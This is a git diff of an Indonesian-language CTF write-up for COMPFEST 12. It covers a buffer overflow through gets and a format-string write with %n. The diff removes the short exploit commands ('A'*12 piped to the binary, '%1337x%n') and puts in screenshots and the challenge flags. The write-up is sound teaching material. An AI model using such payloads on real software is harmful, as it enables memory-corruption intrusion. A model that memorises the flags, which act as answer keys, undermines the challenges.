@@ -470,16 +470,11 @@ int main(int argc, char const *argv[])
 
 Untuk mendapatkan flag, nilai variable `hack_me` harus lebih dari 2. Inputan disimpan pada variable buf yang memiliki panjang 10 karakter, dengan input melebihi 10 karakter, inputan kita akan masuk ke variable `hack_me` karena input diambil dengan fungsi `gets` yang memiliki bug buffer overflow.
 
-```sh
-$ python -c 'print "A"*12' | ./ez_buffow 
-Enter a number (Max 10 digits)
-Hi, here is your flag
-cat: flag.txt: No such file or directory
-```
+![FLAG](https://abdullahnz.github.io/assets/images/PWN-1.png)
 
 ### FLAG
 
-`Service mati :p`
+`COMPFEST12{That_was_ez_right_76a7fb}`
 <br />
 <br />
 
@@ -694,18 +689,11 @@ Hello, 0x7fffffffdbfc.0x7fffffffdbfc.(nil)!
 
 Ternyata alamat target terletak pada offset pertama. Overwrite target dengan nilai 1337 dan didapatkan flag.
 
-```sh
-abdullahnz@zeroday:~/CTF/COMPFEST/hc/pwn/Format_String_EZ ./fmt1 
-What's your name?
-%1337x%n
-Hello,
-a48b950c!
-cat: flag.txt: No such file or directory
-```
+![FLAG](https://abdullahnz.github.io/assets/images/PWN-3.png)
 
 ### FLAG 
 
-Service mati.
+`COMPFEST12{BewareOfFormatStringAttacks}`
 <br/>
 <br/>
 
